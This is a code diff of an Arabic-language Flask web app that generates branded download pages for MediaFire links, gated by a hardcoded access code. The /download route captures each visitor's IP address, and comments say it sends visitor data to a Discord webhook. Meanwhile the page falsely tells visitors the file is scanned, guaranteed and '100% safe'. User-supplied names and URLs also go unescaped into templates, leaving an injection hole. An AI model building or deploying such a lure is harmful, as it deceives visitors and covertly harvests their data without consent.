@@ -4,7 +4,7 @@ import urllib.parse
 
 app = Flask(__name__)
 
-# 🔑 رمز الدخول الخاص بك لرفع الملفات
+# 🔑 رمز الدخول الخاص بك لإنشاء الصفحات
 SECRET_ACCESS_CODE = "XOREYT123400028"
 
 # 🔔 رابط Discord Webhook الخاص بك لإرسال معلومات الزوار
@@ -53,6 +53,7 @@ HTML_LAYOUT = """
 
     <div class="max-w-md w-full glass-panel rounded-3xl p-6 sm:p-8 shadow-2xl text-center relative z-10 my-6">
         
+        <!-- 🚀 كرت قنواتك وحساباتك الرسمية -->
         <div class="mb-8 p-4 bg-slate-900/60 rounded-2xl border border-slate-800/80">
             <p class="text-xs font-bold text-slate-400 mb-3 tracking-wider">انضم وتابع مجتمعنا عبر القنوات التالية 🌟</p>
             <div class="grid grid-cols-3 gap-2 sm:gap-3">
@@ -126,119 +127,77 @@ def home():
         user_code = request.form.get('access_code')
         recaptcha_response = request.form.get('g-recaptcha-response')
         custom_name = request.form.get('file_name')
-        direct_file_url = request.form.get('direct_file_url')
+        mediafire_url = request.form.get('mediafire_url')
 
         if user_code != SECRET_ACCESS_CODE:
-            error_msg = "❌ رمز الحماية غير صحيح! غير مصرح لك برفع الملفات."
+            error_msg = "❌ رمز الحماية غير صحيح!"
         elif not verify_recaptcha(recaptcha_response):
             error_msg = "⚠️ يرجى تأكيد أنك لست برنامج روبوت!"
-        elif direct_file_url and custom_name:
-            share_link = request.host_url + f"download?name={urllib.parse.quote(custom_name)}&url={urllib.parse.quote(direct_file_url)}"
+        elif mediafire_url and custom_name:
+            # إنشاء رابط المشاركة الطويل كاملاً بدون قص
+            share_link = request.host_url + f"download?name={urllib.parse.quote(custom_name)}&url={urllib.parse.quote(mediafire_url)}"
             
             content = f"""
             <div class="w-16 h-16 bg-emerald-500/20 text-emerald-400 rounded-full flex items-center justify-center mx-auto mb-4 text-3xl border border-emerald-500/30">✓</div>
-            <h1 class="text-2xl font-black text-white mb-2">تم رفع الملف بنجاح!</h1>
+            <h1 class="text-2xl font-black text-white mb-2">تم تجهيز رابط الصفحة!</h1>
             <p class="text-xs text-slate-400 mb-6">اسم الملف: <span class="text-indigo-300 font-bold">{custom_name}</span></p>
             
             <div class="bg-slate-950/80 p-3.5 rounded-2xl border border-slate-800 mb-4 overflow-x-auto">
                 <input type="text" value="{share_link}" readonly id="linkInput" class="w-full bg-transparent text-xs text-center text-indigo-300 font-mono outline-none select-all whitespace-nowrap">
             </div>
             
-            <button onclick="navigator.clipboard.writeText('{share_link}'); alert('تم نسخ الرابط الكلي بنجاح!');" class="glow-button w-full bg-indigo-600 hover:bg-indigo-500 text-white font-bold py-3.5 rounded-xl transition-all text-sm mb-3">
-                📋 نسخ الرابط للمشاركة
+            <button onclick="navigator.clipboard.writeText('{share_link}'); alert('تم نسخ الرابط الكامل بنجاح!');" class="glow-button w-full bg-indigo-600 hover:bg-indigo-500 text-white font-bold py-3.5 rounded-xl transition-all text-sm mb-3">
+                📋 نسخ رابط المشاركة
             </button>
             
-            <a href="/" class="block text-xs text-slate-400 hover:text-slate-200 transition-colors mt-2">رفع ملف آخر</a>
+            <a href="/" class="block text-xs text-slate-400 hover:text-slate-200 transition-colors mt-2">إنشاء رابط لملف آخر</a>
             """
-            return render_template_string(HTML_LAYOUT, content=content, title="تم الرفع بنجاح")
+            return render_template_string(HTML_LAYOUT, content=content, title="تم تجهيز الرابط")
         else:
-            error_msg = "فشل في رفع الملف، يرجى المحاولة مرة أخرى."
+            error_msg = "يرجى تعبئة جميع الحقول بشكل صحيح."
 
-    error_html = f'<div id="errorBox" class="p-3 mb-4 text-xs text-red-400 bg-red-500/10 border border-red-500/30 rounded-xl">{error_msg}</div>' if error_msg else '<div id="errorBox" class="hidden p-3 mb-4 text-xs text-red-400 bg-red-500/10 border border-red-500/30 rounded-xl"></div>'
+    error_html = f'<div class="p-3 mb-4 text-xs text-red-400 bg-red-500/10 border border-red-500/30 rounded-xl">{error_msg}</div>' if error_msg else ''
 
     content = f"""
     <div class="w-14 h-14 bg-indigo-500/20 text-indigo-400 rounded-2xl flex items-center justify-center mx-auto mb-4 border border-indigo-500/30 text-2xl">🔐</div>
-    <h1 class="text-xl font-black text-white mb-1">لوحة الرفع الخاصة</h1>
-    <p class="text-slate-400 text-xs mb-6">هذه الصفحة محمية، أدخل رمز الحماية المعتمد للرفع</p>
+    <h1 class="text-xl font-black text-white mb-1">لوحة إعداد رابط التحميل</h1>
+    <p class="text-slate-400 text-xs mb-6">أدخل رابط ميديا فاير واسم الملف ليتم إظهاره بواجهتك</p>
     
     {error_html}
 
-    <form id="uploadForm" method="POST" class="space-y-4 text-right">
-        <input type="hidden" name="direct_file_url" id="direct_file_url">
-        
+    <form method="POST" class="space-y-4 text-right">
         <div>
             <label class="block text-xs font-bold text-amber-400 mb-1">🔑 رمز الدخول الخاص:</label>
             <input type="password" name="access_code" placeholder="أدخل رمز الحماية هنا" required class="w-full p-3 bg-slate-950/70 border border-amber-500/30 rounded-xl text-white placeholder-slate-600 focus:border-amber-400 outline-none text-xs transition-all">
         </div>
 
         <div>
-            <label class="block text-xs font-bold text-slate-300 mb-1">اسم الملف للعرض:</label>
-            <input type="text" name="file_name" placeholder="مثال: المستند_الهام.pdf" required class="w-full p-3 bg-slate-950/70 border border-slate-800 rounded-xl text-white placeholder-slate-600 focus:border-indigo-500 outline-none text-xs transition-all">
+            <label class="block text-xs font-bold text-slate-300 mb-1">اسم الملف للعرض في الصفحة:</label>
+            <input type="text" name="file_name" placeholder="مثال: مود_السيارات_الجديد.zip" required class="w-full p-3 bg-slate-950/70 border border-slate-800 rounded-xl text-white placeholder-slate-600 focus:border-indigo-500 outline-none text-xs transition-all">
         </div>
         
         <div>
-            <label class="block text-xs font-bold text-slate-300 mb-1">اختر الملف المراد رفعه:</label>
-            <input type="file" id="fileInput" required class="w-full p-2 bg-slate-950/70 border border-slate-800 rounded-xl text-xs text-slate-400 file:ml-3 file:py-1.5 file:px-3 file:rounded-lg file:border-0 file:bg-indigo-600/20 file:text-indigo-300 font-bold">
+            <label class="block text-xs font-bold text-slate-300 mb-1">رابط ميديا فاير (MediaFire):</label>
+            <input type="url" name="mediafire_url" placeholder="https://www.mediafire.com/file/..." required class="w-full p-3 bg-slate-950/70 border border-slate-800 rounded-xl text-white placeholder-slate-600 focus:border-indigo-500 outline-none text-xs transition-all text-left" dir="ltr">
         </div>
 
         <div class="flex justify-center my-4 overflow-hidden rounded-xl">
             <div class="g-recaptcha" data-sitekey="{RECAPTCHA_SITE_KEY}" data-theme="dark"></div>
         </div>
 
-        <button type="submit" id="submitBtn" class="glow-button w-full bg-indigo-600 hover:bg-indigo-500 text-white font-bold py-3.5 rounded-xl transition-all text-sm flex items-center justify-center gap-2">
-            <span id="btnText">حفظ وإنشاء رابط المشاركة</span>
+        <button type="submit" class="glow-button w-full bg-indigo-600 hover:bg-indigo-500 text-white font-bold py-3.5 rounded-xl transition-all text-sm">
+            حفظ وإنشاء رابط الصفحة
         </button>
     </form>
-
-    <script>
-    document.getElementById('uploadForm').addEventListener('submit', async function(e) {{
-        e.preventDefault();
-        const fileInput = document.getElementById('fileInput');
-        const submitBtn = document.getElementById('submitBtn');
-        const btnText = document.getElementById('btnText');
-        const errorBox = document.getElementById('errorBox');
-
-        if (!fileInput.files.length) return;
-
-        btnText.innerText = 'جاري رفع الملف... ⏳';
-        submitBtn.disabled = true;
-        submitBtn.classList.add('opacity-75');
-
-        try {{
-            const formData = new FormData();
-            formData.append('file', fileInput.files[0]);
-
-            // الرفع المباشر عبر file.io المفتوح يدعم CORS تماماً وبسرعة فائقة
-            const res = await fetch('https://file.io', {{
-                method: 'POST',
-                body: formData
-            }});
-
-            const data = await res.json();
-
-            if (res.ok && data.success && data.link) {{
-                document.getElementById('direct_file_url').value = data.link;
-                this.submit();
-            }} else {{
-                throw new Error('فشل الرفع');
-            }}
-        }} catch (err) {{
-            errorBox.innerText = '❌ تعذر الرفع السريع، حاول مرة أخرى.';
-            errorBox.classList.remove('hidden');
-            btnText.innerText = 'حفظ وإنشاء رابط المشاركة';
-            submitBtn.disabled = false;
-            submitBtn.classList.remove('opacity-75');
-        }}
-    }});
-    </script>
     """
-    return render_template_string(HTML_LAYOUT, content=content, title="لوحة الرفع الخاصة")
+    return render_template_string(HTML_LAYOUT, content=content, title="لوحة الإعداد")
 
 @app.route('/download')
 def download():
     file_name = request.args.get('name', 'ملف للمشاركة')
     file_url = request.args.get('url', '#')
 
+    # إرسال بيانات الزائر للديسكورد
     user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     if user_ip and ',' in user_ip:
         user_ip = user_ip.split(',')[0].strip()
@@ -249,14 +208,14 @@ def download():
     content = f"""
     <div class="w-20 h-20 bg-indigo-500/20 text-indigo-400 rounded-3xl flex items-center justify-center mx-auto mb-6 border border-indigo-500/30 text-4xl shadow-inner">📄</div>
     <h1 class="text-2xl font-black text-white mb-2">{file_name}</h1>
-    <p class="text-xs text-slate-400 mb-8">الملف مفحوص ومضمون، وهو جاهز للتحميل المباشر الآن</p>
+    <p class="text-xs text-slate-400 mb-8">الملف مفحوص ومضمون، اضغط أدناه للانتقال للتحميل المباشر</p>
 
-    <a href="{file_url}" target="_blank" download class="glow-button w-full bg-emerald-600 hover:bg-emerald-500 text-white font-bold py-4 px-6 rounded-2xl flex items-center justify-center gap-2 transition-all shadow-lg shadow-emerald-900/30 text-sm">
+    <a href="{file_url}" target="_blank" class="glow-button w-full bg-emerald-600 hover:bg-emerald-500 text-white font-bold py-4 px-6 rounded-2xl flex items-center justify-center gap-2 transition-all shadow-lg shadow-emerald-900/30 text-sm">
         <span>⬇️ تحميل الملف الآن</span>
     </a>
     
     <div class="mt-6 flex items-center justify-center gap-1.5 text-xs text-slate-500">
-        <span>🔒 رابط مشفّر وآمن 100%</span>
+        <span>🔒 رابط آمن ومباشر 100%</span>
     </div>
     """
     return render_template_string(HTML_LAYOUT, content=content, title=file_name)
